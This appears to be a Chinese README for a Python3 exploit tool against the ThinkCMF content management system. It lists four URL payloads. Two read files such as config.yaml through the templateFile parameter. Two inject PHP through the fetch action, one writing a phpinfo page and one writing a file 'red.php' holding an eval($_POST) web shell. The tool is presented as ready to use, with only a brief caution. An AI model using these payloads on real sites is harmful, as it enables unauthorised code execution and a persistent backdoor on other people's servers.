# 一个简单python3的thinkcmf-exp
探测以下4个payload:


```url
?a=display&templateFile=README.md
```



```url
?a=display&templateFile=config.yaml
```



```url
?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo();?>')</php>
```



```url
?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('red.php','by:zjun <?php eval($_POST["red"]);?>')</php>
```


此脚本只用了requests和argparse库完成,因此可以即下即用.

该脚本具有一定误差,请谨慎使用,仅供参考!

详见:[zjun's blog](http://www.zjun.info/2020/02/10/thinkcmfexp/)
